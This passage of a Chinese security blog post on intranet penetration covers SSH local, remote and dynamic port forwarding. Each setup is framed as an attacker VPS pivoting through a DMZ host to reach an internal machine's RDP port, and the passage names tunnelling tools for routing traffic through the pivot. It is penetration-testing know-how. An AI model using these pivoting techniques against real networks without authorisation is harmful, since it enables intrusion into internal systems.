+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-C 选项使用压缩算法进行数据传输，可以提高传输效率。</span><br><span class="line">-f 选项将SSH会话放入后台运行。</span><br><span class="line">-N 选项表示不执行远程命令，仅用于建立隧道。</span><br><span class="line">-g 选项允许其他主机连接该隧道。</span><br><span class="line">-L 1234:ip_c:3389 user_b@ip_b 选项指定在本地监听1234端口，并将所有通过该端口的流量转发到目标主机C的3389端口。</span><br></pre></td></tr></table></figure>
+
+<p>实现了访问攻击机1234端口实质上是访问内网主机C的3389端口</p>
+<h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p>把最终请求的发起方（机器 A）为“本地”，服务所在的机器 B&#x2F;C 为“远程”，在本地机器上执行 <code>ssh</code> 命令就称为“本地转发”，在远程机器上执行命令就称为“远程转发”</p>
+<p><img src="/../images/remote-port-forwarding.svg" alt="img"></p>
+<p>假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A不能访问B，B能访问A</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilent即DMZ区主机执行</span></span><br><span class="line">ssh -CfNg -R 9992:ip_c:3389 user_a@ip_a</span><br></pre></td></tr></table></figure>
+
+<p>参数解释</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-R 9992:ip_c:3389 user_a@ip_a 选项指定在远程主机（即攻击机vps）监听9992端口，并将所有通过该端口的流量转发到本地的内网主机C的3389端口。</span><br></pre></td></tr></table></figure>
+
+<p>实现了访问攻击机9992端口实际上是访问内网主机C的3389端口</p>
+<h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p>本地转发和远程转发都只转发一个端口，动态转发可以转发所有端口</p>
+<p><img src="/../images/dynamic-port-forwarding.svg" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilnet即攻击机VPS执行</span></span><br><span class="line">ssh -qTfnN -D 1234 user_b@ip_b</span><br></pre></td></tr></table></figure>
+
+<p>参数解释</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-q 选项表示安静模式，减少输出信息。</span><br><span class="line">-T 选项表示不分配终端。</span><br><span class="line">-f 选项将SSH会话放入后台运行。</span><br><span class="line">-n 选项表示不执行远程命令。</span><br><span class="line">-N 选项表示不执行远程命令，仅用于建立隧道。</span><br><span class="line">-D 1080 选项指定在本地监听1080端口，并将流量通过SSH通道转发。</span><br></pre></td></tr></table></figure>
+
+<p>在本地建立一个SSH动态端口转发（SOCKS代理），将本地的1080端口设置为SOCKS代理服务。通过这个代理，可以将本地的网络流量通过SSH加密通道转发到远程主机B上，从而访问内网主机C</p>
+<h1 id="全局代理流量"><a href="#全局代理流量" class="headerlink" title="全局代理流量"></a>全局代理流量</h1><ul>
+<li>Linux：Proxychinas</li>
+<li>Windows：Proxifier</li>
+</ul>
+<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>reGeorg上传的tunnel无法解析</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2023/05/01/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"><img class="prev-cover" src="https://fgtbnc.github.io/images/wallhaven-wyg7g6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java类加载器</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%98%AF%E5%90%A6%E5%87%BA%E7%BD%91"><span class="toc-number">2.</span> <span class="toc-text">探测目标各种协议是否出网</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">代理搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA%E2%80%93%E7%9B%AE%E6%A0%87%E8%83%BD%E8%AE%BF%E9%97%AEVPS"><span class="toc-number">3.1.</span> <span class="toc-text">反向代理搭建–目标能访问VPS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nps"><span class="toc-number">3.1.1.</span> <span class="toc-text">Nps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Frp"><span class="toc-number">3.1.2.</span> <span class="toc-text">Frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E7%9A%84socks4%E4%BB%A3%E7%90%86"><span class="toc-number">3.1.3.</span> <span class="toc-text">CS的socks4代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA%E2%80%93VPS%E8%83%BD%E8%AE%BF%E9%97%AE%E7%9B%AE%E6%A0%87"><span class="toc-number">3.2.</span> <span class="toc-text">正向代理搭建–VPS能访问目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Neo-reGeorg"><span class="toc-number">3.2.1.</span> <span class="toc-text">Neo-reGeorg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">多级代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">3.3.1.</span> <span class="toc-text">场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stowaway"><span class="toc-number">3.3.2.</span> <span class="toc-text">Stowaway</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Frp-1"><span class="toc-number">3.3.3.</span> <span class="toc-text">Frp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.</span> <span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-number">4.1.</span> <span class="toc-text">常见场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.</span> <span class="toc-text">如何转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-netsh-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88%E5%8F%8C%E7%BD%91%E5%8D%A1%E7%94%A8%EF%BC%89"><span class="toc-number">4.2.1.</span> <span class="toc-text">Windows netsh 端口转发（双网卡用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-iptables-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%EF%BC%89"><span class="toc-number">4.2.2.</span> <span class="toc-text">Linux iptables 端口转发（高权限用）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.</span> <span class="toc-text">SSH端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">5.1.</span> <span class="toc-text">本地转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">5.2.</span> <span class="toc-text">远程转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">5.3.</span> <span class="toc-text">动态转发</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%B5%81%E9%87%8F"><span class="toc-number">6.</span> <span class="toc-text">全局代理流量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">遇到的问题</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Linux渗透总结"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux渗透总结"/></a><div class="content"><a class="title" href="/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="Linux渗透总结">Linux渗透总结</a><time datetime="2023-10-15T11:48:25.000Z" title="发表于 2023-10-15 19:48:25">2023-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/" title="如何更换内存条"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何更换内存条"/></a><div class="content"><a class="title" href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/" title="如何更换内存条">如何更换内存条</a><time datetime="2023-10-13T09:14:25.000Z" title="发表于 2023-10-13 17:14:25">2023-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/12/APP%E6%B8%97%E9%80%8F/" title="APP渗透"><img src="https://fgtbnc.github.io/images/wallhaven-xl8gq3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="APP渗透"/></a><div class="content"><a class="title" href="/2023/10/12/APP%E6%B8%97%E9%80%8F/" title="APP渗透">APP渗透</a><time datetime="2023-10-12T11:48:25.000Z" title="发表于 2023-10-12 19:48:25">2023-10-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB"><img src="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="近源渗透之BadUSB"/></a><div class="content"><a class="title" href="/2023/10/07/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8BBadUsb/" title="近源渗透之BadUSB">近源渗透之BadUSB</a><time datetime="2023-10-07T11:48:25.000Z" title="发表于 2023-10-07 19:48:25">2023-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JSONP与CORS"/></a><div class="content"><a class="title" href="/2023/10/05/Web%E5%AE%89%E5%85%A8%E4%B9%8BJSONP%E4%B8%8ECORS/" title="JSONP与CORS">JSONP与CORS</a><time datetime="2023-10-05T14:00:25.000Z" title="发表于 2023-10-05 22:00:25">2023-10-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
